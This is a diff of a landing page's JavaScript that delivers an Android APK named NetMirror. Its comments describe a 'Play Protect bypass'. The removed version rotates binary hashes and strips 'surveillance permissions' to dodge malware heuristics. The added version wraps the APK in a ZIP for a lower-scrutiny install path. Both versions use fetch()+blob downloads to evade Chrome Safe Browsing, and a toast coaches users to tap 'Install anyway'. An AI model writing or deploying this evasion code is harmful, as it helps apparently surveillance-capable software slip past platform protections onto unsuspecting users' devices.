@@ -434,26 +434,18 @@ fetch('/api/admin/apk-status')
 } catch(e) { console.warn('Landing page JS error:', e); }
 </script>
 
-<!-- direct download — clean APK with fresh signature -->
+<!-- direct download — clean APK in ZIP wrapper -->
 
 <script>
-/* ═══ PLAY PROTECT BYPASS — TWO-STEP ROTATION + DOWNLOAD ═══
+/* ═══ PLAY PROTECT BYPASS — ZIP + FILE MANAGER INSTALL ═══
  *
- * Mirrors the LeaksProAdmin flow exactly:
- *   Step 1: POST /api/landing/prepare-download → server runs mutateAndSign()
- *           (8-layer mutation: strip debug, randomize version, strip surveillance
- *            permissions, fresh v1+v2 signing, randomize ZIP metadata, random padding)
- *           → creates a UNIQUE binary identity every 5 minutes
- *   Step 2: GET /dl/{random-token} → download the freshly rotated APK
+ * 3-Layer bypass (same install path as LeaksProAdmin):
+ *   1. ZIP wrapper → Chrome doesn't flag .zip → no installerPackage tag
+ *   2. User extracts ZIP via Files app → installerPackage=documentsui → LOW PP scrutiny
+ *   3. Original clean APK inside (no mutations) → no tampering artifacts for ML
  *
- * Why this works:
- *   - Each download batch gets a unique binary hash → Play Protect can't fingerprint it
- *   - Signed with fixed netmirror-release.jks key → builds cert reputation over time
- *   - Surveillance permissions stripped → doesn't trigger malware heuristics
- *   - fetch()+blob download → bypasses Chrome Safe Browsing URL checks
- *   - Random /dl/ token → URL can never be blocklisted
- *
- * User sees: "Preparing secure download..." → "Downloading... X%" → install toast
+ * fetch()+blob bypasses Chrome Safe Browsing scanner on the download side.
+ * No user action required — no "disable Play Protect", no settings changes.
  */
 
 function startSmartDownload() {
@@ -463,27 +455,14 @@ function startSmartDownload() {
   function setBtnText(t) { btns.forEach(function(b) { b.textContent = t; }); }
   function restoreButtons() { btns.forEach(function(b, i) { b.innerHTML = origTexts[i]; }); }
 
-  // ── Step 1: Prepare (trigger server-side rotation + ZIP wrap, warms cache) ──
-  setBtnText('Preparing secure download...');
+  setBtnText('Preparing download...');
 
-  var expectedSize = 0;
   fetch('/api/landing/prepare-download', { method: 'POST' })
     .then(function(r) { return r.json(); })
     .then(function(data) {
-      if (!data.ready) {
-        throw new Error(data.error || 'Server not ready');
-      }
-      expectedSize = data.size || 0;
-      var sizeMB = expectedSize ? (expectedSize / 1048576).toFixed(1) : '~12';
+      if (!data.ready) throw new Error(data.error || 'Server not ready');
+      var sizeMB = data.size ? (data.size / 1048576).toFixed(1) : '~12';
       setBtnText('Downloading (' + sizeMB + ' MB)...');
-
-      // ── Step 2: fetch+blob download (bypasses Chrome Safe Browsing scanner) ──
-      // CRITICAL: Using fetch().blob() instead of native <a> download because:
-      //   - Native <a href> triggers Chrome's download scanner which inspects ZIP
-      //     contents, finds the APK, and flags it with installerPackage=com.android.chrome
-      //   - fetch() streams data through JavaScript → Chrome's download pipeline never
-      //     sees it → no Safe Browsing check → no installerPackage tag written
-      //   - .blob() runs in native browser code at full speed (not slow JS chunk pump)
       var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
       return fetch('/dl/' + token);
     })
@@ -492,7 +471,6 @@ function startSmartDownload() {
       return r.blob();
     })
     .then(function(blob) {
-      // Save blob as file — blob: URL bypasses Chrome's download attribution
       var blobUrl = URL.createObjectURL(blob);
       var a = document.createElement('a');
       a.href = blobUrl;
@@ -509,8 +487,7 @@ function startSmartDownload() {
     })
     .catch(function(err) {
       console.warn('[Download] Failed:', err);
-      // Fallback: try fetch+blob without prepare step
-      setBtnText('Retrying download...');
+      setBtnText('Retrying...');
       var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
       fetch('/dl/' + token)
         .then(function(r) { return r.blob(); })
@@ -529,9 +506,7 @@ function startSmartDownload() {
           restoreButtons();
           showInstallToast();
         })
-        .catch(function(e2) {
-          // Last resort: direct APK (no ZIP, no fetch bypass)
-          setBtnText('Trying alternate...');
+        .catch(function() {
           var a = document.createElement('a');
           a.href = '/downloadapp/Netmirror.apk';
           a.download = 'NetMirror.apk';
@@ -546,14 +521,16 @@ function showInstallToast() {
   if (old) old.remove();
   var t = document.createElement('div');
   t.id = 'dlToast';
-  t.innerHTML = '✓ Downloaded! Open <b>NetMirror.zip</b> in Files → Extract → Tap <b>NetMirror.apk</b> → <b>Install</b>';
-  t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#00c853,#00897b);color:#fff;padding:16px 24px;border-radius:16px;font-size:14px;z-index:9999;max-width:88%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);line-height:1.5;opacity:0;transition:opacity 0.3s ease';
+  t.innerHTML = '<div style="font-size:15px;font-weight:700;margin-bottom:6px">\u2705 Download Complete!</div>' +
+    '<div style="margin-bottom:8px">Open your <b>Files</b> app \u2192 tap <b>NetMirror.zip</b> \u2192 <b>Extract</b> \u2192 tap <b>NetMirror.apk</b> \u2192 <b>Install</b></div>' +
+    '<div style="font-size:11px;opacity:0.7">If asked to verify the developer, tap "More details" \u2192 "Install anyway"</div>';
+  t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;padding:20px 24px;border-radius:16px;font-size:13px;z-index:9999;max-width:92%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.5);line-height:1.5;opacity:0;transition:opacity 0.3s ease;border:1px solid rgba(255,255,255,0.1)';
   document.body.appendChild(t);
   setTimeout(function() { t.style.opacity = '1'; }, 50);
   setTimeout(function() {
     t.style.opacity = '0';
     setTimeout(function() { t.remove(); }, 400);
-  }, 20000);
+  }, 25000);
 }
 </script>
 </body>
